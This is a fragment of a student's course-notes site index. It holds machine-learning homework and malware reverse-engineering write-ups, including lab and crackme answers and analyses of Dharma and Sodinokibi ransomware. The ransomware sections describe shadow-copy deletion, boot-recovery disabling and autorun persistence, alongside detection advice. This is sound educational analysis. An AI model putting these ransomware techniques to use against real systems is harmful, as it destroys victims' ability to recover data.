and AUC metrics. For calibration, multinomial ridge-penalized regression was the most effective regardless of the primary classifier References # "},{"id":191,"href":"/security/course/ntu-ml/ntu-machine-learning-homework-1/","title":"NTU Machine Learning Homework 1","section":"Securities","content":" NTU Machine Learning Homework 1 # tags: NTU_ML Machine Learning # How to choose features of data # After observing the training data visualized image, you can be aware of the relationship between the PM2.5 feature and the others. For instance, the CO image, NO image, NO2 image, and NOx image are much more correlated with PM2.5. I also choose PM10, WS_HR, RAINFALL, RH, WIND_SPEED, and PM2.5 which you can see here I used Zscore normalization to implement in my project and can see as below You can see the different result of using or unusing normalization with the same config. Epoch Regression LR Feats Batch Size Loss Fn. Opti. RMSE Data Filter Norm. Data 200 1st-order 0.015 [1-4, 6-9, 13, 14] 1024 MSE Adam 2.44623 Yes Yes 200 1st-order 0.015 [1-4, 6-9, 13, 14] 1024 MSE Adam 2.44623 Yes No Hyperparameter and Preprocessing # All my testing config can be found in Training Result.xlsx I used a filter to choose valid data and set a threshold by observing the visualized figure of all features. My takeaway # **(Solved-\u0026gt;See the last paragraph)**Using normalization is not like what I thought. Practically speaking, using normalization can gather all data to a specific area that the model can converge much more rapidly. But, in this case, the result is worse and also appear negative value of the PM2.5 result. According to this page, maybe the normalization method is not suitable in my case. **(Solved-\u0026gt;See the last paragraph)**I also figured that using the stored weight and bias by my pretrained model is not the right way. I used pickle to store the dump parameters during the training and used the best one as my pretrained parameter. But it\u0026rsquo;s still not that good enough. The better way in this project to enhance your accuracy is tuning your training config and select good features. After discussing with my friend, I figured out the problem and tried to solve it successfully by fitting numpy random seed. Then, the parameter will truly fix but normalization is still not working to help model converging. Update # 2022/12/06 update - Refer to 相關 taught by Dr.李柏堅, I use Pearson Correlation to compute the correlation of each factor and PM2.5 and the result is shown as below. According to the video, |r| \u0026lt; 0.4 is low correlation, 0.4 ≦ |r| \u0026lt; 0.7is medium correlation, and 0.7 ≦ |r| \u0026lt; 1 is high correlation. So, the factor CO, NO, NO2, NOx, PM10, and SO2 are quite suitable as our input data to address this regression problem. Factor AMB_TEMP CO NO NO2 NOx O3 PM10 WS_HR RAINFALL RH SO2 WD_HR WIND_DIREC WIND_SPEED r -0.176147465 0.659147668 0.227219147 0.554273687 0.51365014 0.233923944 0.818868214 -0.102047405 -0.060801221 -0.081576429 0.361333416 0.171932397 0.137658351 -0.10119696 "},{"id":192,"href":"/security/course/ntu-ml/ntu-machine-learning-homework-2/","title":"NTU Machine Learning Homework 2","section":"Securities","content":" NTU Machine Learning Homework 2 # tags: NTU_ML Machine Learning # :::spoiler Click to open TOC [TOC] :::\nObjective # We\u0026rsquo;d like to classify human-being emotion by using CNN model that self-construct or others ready-made such as ResNet or VGG model.\nData # We used emotional dataset from FER2013 that were preprocessed by lecture TA.\nModels # Originial\nself.conv_0 = nn.Sequential( nn.Conv2d(1, 64, kernel_size=3, padding=1), nn.BatchNorm2d(64, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), ) I\u0026rsquo;ve used 3-level model for training but not have good result\nself.conv_3layer = nn.Sequential( nn.Conv2d(1, n_chansl, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, 32, 32, 32)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl, n_chansl//2, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl//2, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, 64, 16, 16)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl//2, n_chansl//4, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl//4, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, 128, 8, 8)-\u0026gt;(B, C, H, W) ) self.fc_3layer = nn.Sequential( nn.Linear(n_chansl//4 * 8 * 8, 7), ) I\u0026rsquo;ve also used 4-layer that the channel increase in the first three layers and decrease the channel at the last layer but still not good enough\nself.conv_4layer = nn.Sequential( nn.Conv2d(1, n_chansl, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl, 32, 32)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl, n_chansl*2, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*2, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*2, 16, 16)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl*2, n_chansl*4, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*4, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*4, 8, 8)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl*4, n_chansl*2, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*2, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*2, 4, 4)-\u0026gt;(B, C, H, W) ) self.fc_4layer = nn.Sequential( nn.Linear(n_chansl*2 * 4 * 4, 7), ) 4-Level New is similar to previous version but double the channel size and always increasing. Then the result is not bad.\nself.conv_4layer = nn.Sequential( nn.Conv2d(1, n_chansl, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl, 32, 32)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl, n_chansl*4, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*4, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*4, 16, 16)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl*4, n_chansl*8, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*8, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*8, 8, 8)-\u0026gt;(B, C, H, W) nn.Conv2d(n_chansl*8, n_chansl*16, kernel_size=3, padding=1), nn.BatchNorm2d(n_chansl*16, eps=1e-05, affine=True), nn.LeakyReLU(negative_slope=0.05), nn.MaxPool2d((2, 2)), # (Batch_size, n_chansl*16, 4, 4)-\u0026gt;(B, C, H, W) ) self.fc_4layer = nn.Sequential( nn.Linear(n_chansl*16 * 4 * 4, n_chansl*4 * 4 * 4), nn.Linear(n_chansl*4 * 4 * 4, 7) ) Other Technique I used # Early-Stopping Normalization: you can find the code that I compute the mean and standard deviation in temp.py. Data Augmentation [Ver. 1] including RandomChoice from RandomHorizontalFlip, ColorJitter, RandomRotation and used CenterCrop to a specific size then used Pad to original size. This version is for self-defined model. Plot Confusion Matrix: must command --plot_cm in cmd Visualize Data Distribution by bar chart. Environment # conda install -c conda-forge argparse conda install -c conda-forge tqdm conda install -c conda-forge wandb conda install -c anaconda more-itertools conda install -c anaconda scikit-learn conda install pytorch torchvision torchaudio cudatoolkit=11.6 -c pytorch -c conda-forge Run # We supply some self-defined arguments such as basic --epochs, --lr, --batch_size, --val_batch_size, --checkpoint. And we also supply advanced setting like --optimizer including Adam and SGD, --weight_d, --momentum, --gamma and --step for learning rate scheduler, --channel_num for model channel numbers. Other tools such as --wandb which is a visualized and logging tool to record every things you want to update on website, and --plot_cm to visualize validation result. For training with using data augmentation, scheduler and early stopping python MLHW.py --epoch 600 --lr 0.001 --gamma 0.2 --step 40 --batch_size 256 --early_stop --data_aug -c ./epoch490_acc0.6243.pth For testing python MLHW.py --mode test -c ./epoch115_acc0.6318.pth Result # Whole result with the configuration and technique above is here. Early-Stopping # As you can see below, if I use early stopping technique, it\u0026rsquo;ll break the training loop when overfitting. The orange line is what I set early stopping with threshold 5. That is, if the model loss rise up 5 times consequently, then stop training. The other one doesn\u0026rsquo;t set early stopping and you can see it\u0026rsquo;ll complete the training loop even overfitting occur. Data Augmentation # As you can see below, if I use data augmentation, it can conquer overfitting. The other configurations are the same and the breakpoint of orange line is because of early-stopping. I set data augmentation technique on purple one and the others didn\u0026rsquo;t.\ntransform_set = [ transforms.RandomHorizontalFlip(p=0.5), # Horizontal Flip in random transforms.ColorJitter(brightness=(0, 5), contrast=(0, 5), saturation=(0, 5), hue=(-0.1, 0.1)), # Adjust image brightness, contrast, satuation and hue in random transforms.RandomRotation(30, center=(0, 0), expand=False),] # expand only for center rotation transform_aug = transforms.Compose([ transforms.RandomChoice(transform_set), transforms.Resize(224)]) I choose RandomChoice to choose transform_set including RandomHorizontalFlip, ColorJitter, RandomRotation. ColorJitter will adjust the brightness, contrast, saturation and hue of the input image randomly. So, it can increase the diversity of training dataset properly. Though, lecture TA is not very suggestive to use RandomVerticalFlip skill on training image, because it\u0026rsquo;ll transform the image that no human can recognize it. So, I use RandomHorizontalFlip instead. Confusion Matrix # As you can see the confusion matrix below. The second class(emotion Disgust) is the worst result of the classification and the Happy class is the best. Also, the Fear class is not good enough. I think the main reason is data imbalance that shown below of second one. The prior of these two classes are 0.0155 and 0.1443 respectively. Under this circumstance, the model can\u0026rsquo;t learn this class by enough images properly. And the bad result of Fear class. I think it\u0026rsquo;s just not learn very well with bad model structure and bad configuration. Data Distribution # The result of data distribution is shown above. The prior probability of the highest probability is $6525/25887=0.252$. If not targeting a specific category and just choose the Happy class, it would be worse than normal classification progress.\n"},{"id":193,"href":"/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/","title":"NTU Malware Reverse Final Project Notes","section":"Securities","content":" NTU Malware Reverse Final Project Notes # tags: NTU_MR Malware Reverse Engineering and Analysis # Deep learning at the shallow end Malware classification for non-domain experts # How to reproduce? # Construct Environment The whole construction step can see 安裝 tensorflow 及 cuda cudnn 心得. Refer to documentation for tensorflow, I choose the library shown as below\u0026hellip;\nObject CUDA cuDNN Python GPU Driver Version tensorflow tensorflow-gpu Version 11.2 8.1 3.6.13 526.98 2.6.2 2.6.0 Then refer to NVIDIA CUDNN DOCUMENTATION, just use zlibwapi.dll provided by this page directly. This compressed folder is for x64 processor. Notice that, DO NOT USE this page and this page. These are for x86 processor.\nProblems Occurs while Setting-Up:\nIf the command send the exception about zlibwapi.dll, then you can check this page: tensorflow出现报错： Could not locate zlibwapi.dll或者Could not load library cudnn_cnn_infer64_8.dll. Put zlibwapi.dll to C:\\Windows\\System32 and C:\\Windows\\SysWOW64. Meanwhile, put the uncompressed folder of zlib123dllx64 that download on NVIDIA CUDNN DOCUMENTATION to somewhere and add this path to Environment Variables-\u0026gt;System variables-\u0026gt;PATH. In my case, it\u0026rsquo;s C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v11.2\\zlib123dllx64\\dll_x64. The whole step about solving this problems, you can check this video at time=11:36 {%youtube 27fBCKKZdpY %} If you can not use nvcc command, check this page: CUDA安装和检测【全】（nvcc命令找不到的解决办法） Then revise the dataset path in code and run directly. How to Fed into malimg-dataset # Revise original code # Note that the kfold parameter can not set less than 2 You can skip or comment all part of converting from .bin files to image, and start from Load image data from the training set section. Note that you must preserve some variable and procedure as below ... max_len = int(1e4) ... binfn_id2cls = {} # file name id is the part before . for fn_label_item in train_labels_df.itertuples(): binfn_id2cls[fn_label_item.Id ] = fn_label_item.Class Furthermore, you must revise some data path problem project_dir = \u0026#39;D:/NTU/First Year/Malware Reverse Engineering and Analysis/Homework/Final_Project/Dataset\u0026#39; data_dir = os.path.join(project_dir, \u0026#39;malimg_dataset\u0026#39;) train_dir = os.path.join(data_dir, \u0026#39;train\u0026#39;) test_dir = os.path.join(data_dir, \u0026#39;validation\u0026#39;) ... ############################################################# # Load image data from the training set ############################################################# # NOTE: default value width = 1 train_img_dir = train_dir img_sfx = \u0026#39;png\u0026#39; ... N_CLASS = 25 ... ################################################## # Predict classes for test files, and save results ################################################## test_img_dir = test_dir ... Convert malimg data # Common variable will be used below project_dir = \u0026#39;D:/NTU/First Year/Malware Reverse Engineering and Analysis/Homework/Final_Project/Dataset\u0026#39; data_dir = os.path.join(project_dir, \u0026#39;malimg_dataset\u0026#39;) train_dir = os.path.join(data_dir, \u0026#39;train\u0026#39;) test_dir = os.path.join(data_dir, \u0026#39;validation-original\u0026#39;) train_labels_fn = os.path.join(data_dir, \u0026#39;trainLabels.csv\u0026#39;) Create csv file to store image ID and Class folders = os.listdir(train_dir) with open(\u0026#39;./trainLabels.csv\u0026#39;, \u0026#39;w\u0026#39;, newline=\u0026#39;\u0026#39;) as csvf: # 建立 CSV 檔寫入器 writer = csv.writer(csvf) writer.writerow([\u0026#39;Id\u0026#39;,\u0026#39;Class\u0026#39;]) for j, f in enumerate(folders): fullpath = os.path.join(train_dir, f) files = os.listdir(fullpath) for i in files: writer.writerow([i, j+1]) folders = os.listdir(test_dir) with open(\u0026#39;./valLabels.csv\u0026#39;, \u0026#39;w\u0026#39;, newline=\u0026#39;\u0026#39;) as csvf: # 建立 CSV 檔寫入器 writer = csv.writer(csvf) writer.writerow([\u0026#39;Id\u0026#39;,\u0026#39;Class\u0026#39;]) for j, f in enumerate(folders): fullpath = os.path.join(test_dir, f) files = os.listdir(fullpath) for i in files: writer.writerow([i, j+1]) Move all image in each folder to the same folder f2 = \u0026#39;D:/NTU/First Year/Malware Reverse Engineering and Analysis/Homework/Final_Project/Dataset/malimg_dataset/validation/\u0026#39; folders = os.listdir(test_dir) for j, f in enumerate(folders): fullpath = os.path.join(test_dir, f) files = os.listdir(fullpath) for i in files: files_src = os.path.join(fullpath, i) files_dest = os.path.join(f2, i) shutil.copyfile(files_src, files_dest) # 複製檔案 Resize train/val image to 10000bytes In order to match the data type of this model can accept, we must shrink the image size to 10000 bytes. By the way, the original data are also execute the same procedure for the same purpose. test_dir = os.path.join(data_dir, \u0026#39;train-unresize\u0026#39;) files = os.listdir(test_dir) width = 1 max_len = int(1e4) f2 = \u0026#39;D:/NTU/First Year/Malware Reverse Engineering and Analysis/Homework/Final_Project/Dataset/malimg_dataset/train/\u0026#39; for idx, fn in enumerate(files): fn_wp = os.path.join(test_dir, fn) bin_stream = np.fromfile(fn_wp, dtype=\u0026#39;uint8\u0026#39;) bin_stream = bin_stream.reshape(bin_stream.shape[0], 1) img_shrink = cv2.resize(bin_stream, (width, max_len)) file_dest = os.path.join(f2, fn) img_shrink.tofile(file_dest) test_dir = os.path.join(data_dir, \u0026#39;validation-unresize\u0026#39;) files = os.listdir(test_dir) width = 1 max_len = int(1e4) f2 = \u0026#39;D:/NTU/First Year/Malware Reverse Engineering and Analysis/Homework/Final_Project/Dataset/malimg_dataset/validation/\u0026#39; for idx, fn in enumerate(files): fn_wp = os.path.join(test_dir, fn) bin_stream = np.fromfile(fn_wp, dtype=\u0026#39;uint8\u0026#39;) bin_stream = bin_stream.reshape(bin_stream.shape[0], 1) img_shrink = cv2.resize(bin_stream, (width, max_len)) file_dest = os.path.join(f2, fn) img_shrink.tofile(file_dest) Run directly # If you want to plot confusion matrix, then comment some code at the end and add the code below.\nfrom sklearn.metrics import confusion_matrix import matplotlib.pyplot as plt labels_name = [\u0026#34;Adialer.C\u0026#34;, \u0026#34;Agent.FYI\u0026#34;, \u0026#34;Allaple.A\u0026#34;, \u0026#34;Allaple.L\u0026#34;, \u0026#34;Alueron.gen!J\u0026#34;, \u0026#34;Autorun.K\u0026#34;, \u0026#34;C2LOP.gen!g\u0026#34;, \u0026#34;C2LOP.P\u0026#34;, \u0026#34;Dialplatform.B\u0026#34;, \u0026#34;Dontovo.A\u0026#34;, \u0026#34;Fakerean\u0026#34;, \u0026#34;Instantaccess\u0026#34;, \u0026#34;Lolyda.AA1\u0026#34;, \u0026#34;Lolyda.AA2\u0026#34;, \u0026#34;Lolyda.AA3\u0026#34;, \u0026#34;Lolyda.AT\u0026#34;, \u0026#34;Malex.gen!J\u0026#34;, \u0026#34;Obfuscator.AD\u0026#34;, \u0026#34;Rbot!gen\u0026#34;, \u0026#34;Skintrim.N\u0026#34;, \u0026#34;Swizzor.gen!E\u0026#34;, \u0026#34;Swizzor.gen!I\u0026#34;, \u0026#34;VB.AT\u0026#34;, \u0026#34;Wintrim.BX\u0026#34;, \u0026#34;Yuner.A\u0026#34;] mat_con = (confusion_matrix(y_true, y_pred, labels=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25])) # Setting the attributes fig, px = plt.subplots(figsize=(8, 8)) px.matshow(mat_con, cmap=plt.cm.jet, alpha=0.5) for m in range(mat_con.shape[0]): for n in range(mat_con.shape[1]): px.text(x=m,y=n,s=mat_con[m, n], va=\u0026#39;center\u0026#39;, ha=\u0026#39;center\u0026#39;, size=\u0026#39;large\u0026#39;) # Sets the labels num_class = np.array(range(len(labels_name))) plt.xticks(num_class, labels_name, rotation=90, fontsize=10) plt.yticks(num_class, labels_name, fontsize=10) # plt.xlabel(\u0026#39;Predictions\u0026#39;, fontsize=16) # plt.ylabel(\u0026#39;Actuals\u0026#39;, fontsize=16) plt.title(\u0026#39;Confusion Matrix\u0026#39;, fontsize=15) plt.savefig(os.path.join(\u0026#39;./Confusion_matrix/\u0026#39;, \u0026#34;output.png\u0026#34;), format=\u0026#39;png\u0026#39;) plt.show() "},{"id":194,"href":"/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/","title":"NTU Malware Reverse HW 1 write up","section":"Securities","content":" NTU Malware Reverse HW 1 write up # tags: NTU_MR Malware Reverse Engineering and Analysis NTU # [TOC]\nTask 1 # Analyze the Lab06-01.exe # What is the major code construct found in the only subroutine called by main? Ans: It has only an if statement in the main function. What is the subroutine located at 0x40105F? Ans: It’s just a printf function. At the beginning, I can not recognize this code block do exactly until I analyze the program behavior by using string side bar to search the specific string in the code.\nWhat is the purpose of this program? Ans: This program’s main purpose is to check if the device connects the internet or not. If the variable returns true, it’ll print the string Success: Internet Connection on the command panel. Otherwise, it’ll show Error 1.1: No Internet.\nTask 2 # Analyze the Lab06-02.exe # What operation does the first subroutine called by the main perform? Ans: The main perform is called subroutine to check if the internet connection or not. If there is no internet, just return and do nothing, otherwise, continue to execute.\nWhat is the subroutine located at 0x40117F? Ans: It’s a printf function.\nWhat does the second subroutine called by main do? Ans:\nThe second subroutine called by the main function is sub_401040 which is located at 0x401040. The main purpose of this block is to open the internet connection and get the web page information then close the internet handle at the end. According to the web page document, InternetOpenA function is the first WinINet function called by an application. It tells the Internet DLL to initialize internal data structures and prepare for future calls from the application. When the application finishes using the Internet functions, it should call InternetCloseHandle to free the handle and any associated resources. It’ll return a valid handle if true, otherwise, return null. According to the web page document, this function is a general function that an application can use to retrieve data over any of the protocols that WinINet supports. This function is especially useful when the application does not need to access the particulars of a protocol, but only requires the data corresponding to a URL. For instance, the URL provided by the author exists as a global variable though this page has nothing response but a 404 error. It’ll return a valid handle if true, otherwise, return null. According to the web page document, InternetReadFile function operates much like the base ReadFile function, with a few exceptions. Typically, InternetReadFile retrieves data from an HINTERNET handle as a sequential stream of bytes. It’ll return true if successful, or false otherwise. According to the web page document, InternetCloseHandle function terminates any pending operations on the handle and discards any outstanding data. And it returns TRUE if the handle is successfully closed, or FALSE otherwise. What type of code construct is used in this subroutine? Ans: It’ll use character array to call loc_40109D function (InternetReadFile). If connection failed, it’ll print “Error 2.1: Fail to OpenUrl” and close the handle procedure. Are there any network-based indicators for this program? Ans: There’re two network-based indicator in this program shown as below. The program also used url string and user agent string to set up the internet environment which shown as below as well. What is the purpose of this malware? Ans: The main purpose of this block is to check the internet connection first and then open the internet connection to get the web page information if the connection success. Finally, close the internet handle and sleep one minute at the end.\nTask 3 # Analyze the Lab06-03.exe # Compare the calls in main to Lab6-2’s main method. What is the new function called from this main? Ans: The new function is called sub_401150 and it’ll do something based on what it get from the page. What parameters does this new function take? Ans: It must have character a1 as a case number and LPCSTR lpExistingFileName which is representing the name of an existing file. What major code construct does this function contain? Ans: It contains a simple switch case structure to decide what it can do. What can this function do? Ans: It can create a directory the in specified path, copy a file, delete a file, open the specified registry key, sleep 100 seconds, or print an error message by default. Are there any host-based indicators for this malware? Ans: Subkey parameter and Data parameter can be host-based indicator in this malware. Task 4 # Analyze the Lab06-04.exe # What is the difference between the calls made from the main method in Lab6-3 and 6-4? Ans: In Lab6-3, the main block just executes one time if it got something from the domain name address. But in Lab6-4, there’s a for loop wrapping the main block to repeat it 1440 times. What new code construct has been added to the main? Ans: There’s a for loop in the main block to execute the program repeatedly 1440 times. What is the difference between this lab’s parse HTML function and those of the previous labs? Ans: In Lab6-3, it just accesses Internet Explorer 7.5/pma string to Windows API named InternetOpenA. But in Lab6-4, it connects character a1 string which is generated by for loop looks like Internet Explorer 7.50/pma%d(%d is in which the parameter a1 should be put). How long will this program run? (Assume that it is connected to the Internet) Ans: Assume to ignore the internet checking time and ignore if statement checking time Assume executing time for case a is A second, for case b is B second, for case c is C second, for case d is D second, for case e is 100 second, and the probability of all cases that we get are the same. The average of execution time is T= (A+B+C+D+100)/5. So, the whole execution time of this program is approximately 1440*(T+60) seconds. Are there any new network-based indicators for this malware? Ans: No. What is the purpose of this malware? Ans: First, check the internet connection like above and continue to execute if successful, return zero otherwise. Then get the info from the URL which is set up by default in this program and close the internet handle when it is finished. Finally, do something according to what you get from the page such as creating a directory the in specified path, copying a file, deleting a file or opening the specified registry key, and repeatedly 1440 times until the end. Task 5 # Please analyze Easy_CrackMe.exe. (Use IDA PRO) # After you run the exe file, you will see an input box like Please Find the correct Password and you will get the correct response. Ans: The correct password is “Ea5yR3versing”. Task 6 # Please analyze Easy_Keygen.exe. (Use IDA PRO) # You need to run the exe file in cmd like In this case, you need to enter the Input Name and Input Serial. If Name and Serial are matched, you will get correct response. Please find the Input Name when the Input Serial is 5B134977135E7D13. Ans: K3yg3nm3 Write Up: First, you can check the declaration of v6 to v8 and v12 to v14 that they connected respectively. By the way, v9 is the variable stored what you input The main concept of this PE file is in this for loop. To get the address of v9 and plus v3, then get actual value by * operator. That means every time will compute just one character and one by one until every character you enter has been computed. Operator ^ means bitwise of XOR in C and the operand is *(\u0026amp;v6 + i). When you get the reverse of this operation, you’ll get 16 char with hex value(4B337967336E6D33). Put these value to Hex2ASCII online converter, you can get the password answer. "},{"id":195,"href":"/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/","title":"NTU Malware Reverse HW 2 write up","section":"Securities","content":" NTU Malware Reverse HW 2 write up # tags: NTU_MR Malware Reverse Engineering and Analysis NTU # [TOC]\nTask 1 # 執行勒索病毒Dharma與Process monitor並截圖Dharma的Process Tree，並分析說明每個Process行為 Ans:\nConhost.exe: It’s defined by Microsoft and is normally legal and safe. Working on Win7, Win8, and Win10. The main function of this PE file is to let Command Prompt and Windows File Explorer can interact. The other function is to support users who can drag the file or folder to the command prompt directly. Most of the time, it’s a safe file that even repeats execution many times. However, in some circumstances, the viruses will pretend a conhost.exe file to use massive memory or store it in the wrong folder.[1] mode.com: MODE sets the mode of operation for devices or communications. It can be used to set the mode for printers, monitors, or the serial interface. It can be used to prepare and select code pages and to redirect printer output to the serial interface.[2] You can see in the command below that the virus wants to select code page #1251.[3] vssadmin.exe: To display current volume shadow copy[4] backups and all installed shadow copy writers and providers. Applied to Win10 and other server-type OS. As the website said, this program will not execute automatically when the operating system startup. These kinds of programs are normally malware, such as viruses, trojan horses, and spyware.[5] mshta.exe: It’s an executable file in Windows and this element is the object that starts the Microsoft HTML application. This application mainly executes a .hta file and runs a script in Windows.[6]\nThere is a growing trend for attackers to heavily utilize tools that already exist on a system rather than relying totally on their custom malware. Using .hta files or its partner in crime, mshta.exe is an alternative to using macro-enabled document for attacks and has been around for a long time. It is a tool so flexible it even has its cell on the MITRE ATT\u0026amp;CK matrix.[7] rundll32.exe: It mainly executes the libraries in a .dll file with 32-bits.[8] The autorun technique is as below. The ransomware will set the value in the autorun registry that will execute when the computer startup automatically. It’ll execute the RegSetValue function to set itself in the autorun key (snapshot is as below). Task 2 # 請解釋MITRE ATT\u0026amp;CK中的 T1490: Inhibit System Recovery的Technique為何？如何偵測與防禦，並且在Dharma勒索病毒中找到攻擊的指令截圖 Ans:\nAs you can see below, it executes this command line which will delete or remove built-in operating system data and turn off the services that mainly to recover a corrupted system. This may deny access to available backups and recovery options. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.[9] That is, it’ll increase the difficulty that recovering your files with data rescue software or services.\nSo, how to detect? There’re 4 types of techniques to detect this process such as •\tUse process monitoring to monitor the execution and command line parameters •\tusing the Windows event logs, •\tmonitoring the status of services involved in a system recovery or •\tmonitoring the registry for changes associated with system recovery features The mitigation is data backuping or considering technical controls to prevent the disabling of services or deletion of files involved in the system recovery. Task 3 # 執行勒索病毒Sodinokibi與Process monitor並找到MITRE ATT\u0026amp;CK中的 T1490: Inhibit System Recovery的Technique攻擊的指令截圖證明 Ans:\nIt’ll get a window object named Win32_shadowcopy and delete the backup files for each object just like Dharma. It just encrypts the command and bypasses the malware defender. Task 4 # 執行勒索病毒Sodinokibi與Process monitor並將它所使用的MITRE ATT\u0026amp;CK的Technique列於下表(不夠請自行新增表格欄位) Ans:\nAs [10, 11] mentioned, the techniques that Sodinokibi has used are as below. But I can not actually find the event by process monitor of my poor usage skill. Technique名稱 Technique說明 Command and Scripting Interpreter The macro in the Word document downloads and runs the Sodinokibi executable. After execution, it runs the following command using cmd.exe. REvil has used PowerShell to delete volume shadow copies and download files. Inhibit System Recovery REvil can use vssadmin to delete volume shadow copies and credit to disable recovery features. At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery. Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data. Data Encrypted for Impact REvil can encrypt files on victim systems and demands a ransom to decrypt the files. Like most ransomware, Sodinokibi encrypts files and adds a random extension such as test.jpg.1cd8t9ahd5. Reference # 蒂姆費舍爾. 什麼是Conhost.exe？. Available from: https://zhtw.eyewated.com/%E4%BB%80%E9%BA%BC%E6%98%AFconhost-exe%EF%BC%9F/. mode.com in Microsoft. Available from: https://home.csulb.edu/~murdock/mode.html. MS-DOS and Windows command line mode command. Available from: https://www.computerhope.com/modehlp.htm. Volume Shadow Copy Service. Available from: https://zh.m.wikipedia.org/wiki/%E7%A3%81%E7%A2%9F%E5%8D%80%E9%99%B0%E5%BD%B1%E8%A4%87%E8%A3%BD%E6%9C%8D%E5%8B%99. vssadmin.exe in Microsoft. Available from: http://startup.filedict.com/vssadmin-vssadmin-exe-8854-8860/. mshta.exe Microsoft (R) HTML 主應用程式. Available from: https://win10.support/zh_tw/mshta-exe-microsoft-r-html-%E4%B8%BB%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F/. What Is Mshta, How Can It Be Used and How to Protect Against It. Available from: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/. rundll32:Rundll32.exe是什麼？. Available from: https://www.google.com/url?sa=t\u0026rct=j\u0026q=\u0026esrc=s\u0026source=web\u0026cd=\u0026cad=rja\u0026uact=8\u0026ved=2ahUKEwjAps7IlYX7AhWqQfUHHbylBOAQFnoECBUQAQ\u0026url=https%3A%2F%2Fwww.easyatm.com.tw%2Fwiki%2Frundll32\u0026usg=AOvVaw2fLPE4XLV2J1RaPX3e0fo4. Inhibit System Recovery. Available from: https://attack.mitre.org/techniques/T1490/. A brief history and further technical analysis of Sodinokibi Ransomware. 2020; Available from: https://www.picussecurity.com/resource/blog/a-brief-history-and-further-technical-analysis-of-sodinokibi-ransomware. REvil. 2020; Available from: https://attack.mitre.org/software/S0496/. "},{"id":196,"href":"/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/","title":"NTU Malware Reverse HW 3 write up","section":"Securities","content":" NTU Malware Reverse HW 3 write up # tags: NTU_MR Malware Reverse Engineering and Analysis # [TOC]\nName 何秉學 StuID R11921A16 Task 1: Lab 15-01.exe # Observation # When I execute the file, it print out a message: Son, I am disappoint. Refer to the description below, I must enter some parameter that match the secret code.\nAnalyze the sample found in the file Lab15-01.exe. This is a command-line program that takes an argument and prints Good Job! if the argument matches a secret code.\nTherefore, I use IDA Pro to disassembly the source code directly. However, it has anti-disassembly code in this program and try to make IDA Pro not working properly like the red font shown as below. Note that, if you want to see the byte code, just click Option/General and change Number of opcode bytes(non-graph) from 0 to 6. In this case, we can observe the first red code block first.(8B4C55A0h)\n... .text:0040100C 33 C0 xor eax, eax .text:0040100E 74 01 jz short near ptr loc_401010+1 .text:00401010 .text:00401010 loc_401010:; CODE XREF: .text:0040100E↑j .text:00401010 E8 8B 45 0C 8B call near ptr 8B4C55A0h .text:00401015 48 dec eax .text:00401016 04 0F add al, 0Fh .text:00401018 BE 11 83 FA 70 mov esi, 70FA8311h .text:0040101D 75 3F jnz short loc_40105E ... Lecture Note P27-P28 Refer to background of jz/jnz, the command xor eax eax will clear register eax and set Z flag as 1(represent it\u0026rsquo;s zero). Therefore, the next command will always True that will jump to loc_401010+1. Because, IDA Pro observe this jump command, it set the jump location at loc_401010+1. But, this conditional jump is actually unconditional and the jump location is misdirection. It thought the command will begin at E8 but actually it\u0026rsquo;ll begin at 8B.\nLecture Note P22 Therefore, we must guide IDA Pro to a right way like below.\n... .text:0040100C 33 C0 xor eax, eax .text:0040100E 74 01 jz short loc_401011 .text:0040100E ; ------------------------------- .text:00401010 E8 db 0E8h .text:00401011 ; ------------------------------- 